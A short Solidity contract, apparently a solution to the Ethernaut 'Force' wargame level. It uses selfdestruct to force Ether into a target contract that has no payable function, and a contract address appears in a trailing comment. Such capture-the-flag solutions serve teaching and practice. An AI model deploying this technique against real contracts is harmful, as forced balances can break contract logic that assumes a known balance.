// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSender {

    address payable ethernautForce;

    constructor (){
    }

    function selfDestructAndSend(address payable _target) public{
      selfdestruct(_target);
    }



    receive() external payable{

    }


}
//0xE32F29dEee056c805737CDAd8c9d4a4150Fb24C4
